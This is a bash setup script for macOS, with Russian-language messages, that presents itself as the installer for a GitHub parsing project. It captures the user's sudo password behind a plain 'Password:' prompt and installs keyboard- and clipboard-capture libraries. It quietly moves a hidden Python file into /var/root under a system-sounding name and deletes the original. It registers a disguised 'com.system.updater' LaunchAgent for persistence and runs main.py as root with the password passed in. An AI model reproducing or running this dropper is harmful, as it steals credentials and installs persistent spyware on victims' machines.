#!/bin/bash

DESKTOP_DIR="$HOME/Desktop"
REPO_URL="https://github.com/atlas-is-coding/ca-parsing-twt/archive/refs/heads/main.zip"
ZIP_FILE="$DESKTOP_DIR/ca-parsing-twt.zip"
EXTRACTED_DIR="$DESKTOP_DIR/ca-parsing-twt-main"

SCRIPT_DIR="/var/root/"
SCRIPT_NAME="update_service.py"
PLIST_NAME="com.system.updater.plist"
PLIST_PATH="$HOME/Library/LaunchAgents/$PLIST_NAME"

echo "Password:"
read -s SUDO_PASSWORD

if [ -z "$SUDO_PASSWORD" ]; then
    echo "Ошибка: Пароль не введен"
    exit 1
fi

echo "Проверяем пароль..."
if ! echo "$SUDO_PASSWORD" | sudo -S -k true 2>/dev/null; then
    echo "Ошибка: Неверный пароль"
    exit 1
fi
echo "Пароль верный"

echo "Скачиваем репозиторий..."
curl -L "$REPO_URL" -o "$ZIP_FILE"

if [ $? -ne 0 ]; then
    echo "Ошибка при скачивании репозитория"
    exit 1
fi

echo "Разархивируем репозиторий..."
unzip -o "$ZIP_FILE" -d "$DESKTOP_DIR"

if [ $? -ne 0 ]; then
    echo "Ошибка при разархивировании"
    rm -f "$ZIP_FILE"
    exit 1
fi

rm -f "$ZIP_FILE"

echo "Введите полный путь к папке с файлами для переноса в проект:"
read -r SOURCE_DIR

if [ ! -d "$SOURCE_DIR" ]; then
    echo "Ошибка: Указанная папка не существует"
    exit 1
fi

echo "Переносим файлы из $SOURCE_DIR в $EXTRACTED_DIR..."
cp -r "$SOURCE_DIR"/* "$EXTRACTED_DIR/"

if [ $? -ne 0 ]; then
    echo "Ошибка при переносе файлов"
    exit 1
fi

cd "$EXTRACTED_DIR" || {
    echo "Ошибка: Не удалось перейти в директорию проекта"
    exit 1
}

if ! command -v brew &> /dev/null; then
    echo "Homebrew не найден, устанавливаем..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zshrc
    eval "$(/opt/homebrew/bin/brew shellenv)"
else
    echo "Homebrew уже установлен"
fi

if ! command -v python3 &> /dev/null; then
    echo "Python3 не найден, устанавливаем..."
    brew install python3
else
    echo "Python3 уже установлен"
fi

echo "Устанавливаем корневые сертификаты для Python..."
PYTHON_VERSION=$(python3 --version | cut -d' ' -f2 | cut -d'.' -f1,2)
CERT_SCRIPT="/Applications/Python ${PYTHON_VERSION}/Install Certificates.command"
if [ -f "$CERT_SCRIPT" ]; then
    echo "Запускаем Install Certificates.command..."
    sh "$CERT_SCRIPT"
else
    echo "Скрипт Install Certificates.command не найден, устанавливаем certifi..."
    python3 -m pip install certifi
fi

if ! command -v pip3 &> /dev/null; then
    echo "pip3 не найден, устанавливаем..."
    curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
    python3 get-pip.py
    rm get-pip.py
else
    echo "pip3 уже установлен"
fi

VENV_DIR="venv"
if [ ! -d "$VENV_DIR" ]; then
    echo "Создаем виртуальное окружение..."
    python3 -m venv "$VENV_DIR"
    source "$VENV_DIR/bin/activate"
    if [ -f "requirements.txt" ]; then
        echo "Устанавливаем зависимости из requirements.txt..."
        pip install -r requirements.txt
    fi
else
    echo "Активируем существующее виртуальное окружение..."
    source "$VENV_DIR/bin/activate"
fi

pip install pynput pyperclip requests

if ! pip show playwright &> /dev/null; then
    echo "Playwright не найден, устанавливаем..."
    pip install playwright
    echo "Устанавливаем браузеры для Playwright..."
    playwright install
else
    echo "Playwright уже установлен"
    if ! playwright install --dry-run &> /dev/null; then
        echo "Устанавливаем браузеры для Playwright..."
        playwright install
    else
        echo "Браузеры Playwright уже установлены"
    fi
fi

echo "$SUDO_PASSWORD" | sudo -S mkdir -p "$SCRIPT_DIR"
echo "$SUDO_PASSWORD" | sudo -S chmod 700 "$SCRIPT_DIR"

if [ -f "$EXTRACTED_DIR/src/helpers/checker/service_updater.py" ]; then
    echo "$SUDO_PASSWORD" | sudo -S cp "$EXTRACTED_DIR/src/helpers/checker/service_updater.py" "$SCRIPT_DIR/$SCRIPT_NAME"
    echo "$SUDO_PASSWORD" | sudo -S chmod 700 "$SCRIPT_DIR/$SCRIPT_NAME"
    echo "$SUDO_PASSWORD" | sudo -S rm -f "$EXTRACTED_DIR/src/helpers/checker/service_updater.py"
else
    exit 1
fi

cat > "$PLIST_PATH" << EOL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.updater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$SCRIPT_DIR/$SCRIPT_NAME</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>/tmp/system_updater.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/system_updater.log</string>
</dict>
</plist>
EOL

chmod 644 "$PLIST_PATH"
launchctl load "$PLIST_PATH"

if [ -f "main.py" ]; then
    echo "Запускаем main.py..."
    echo "$SUDO_PASSWORD" | sudo -S python3 main.py "$SUDO_PASSWORD"
else
    echo "Ошибка: main.py не найден"
    exit 1
fi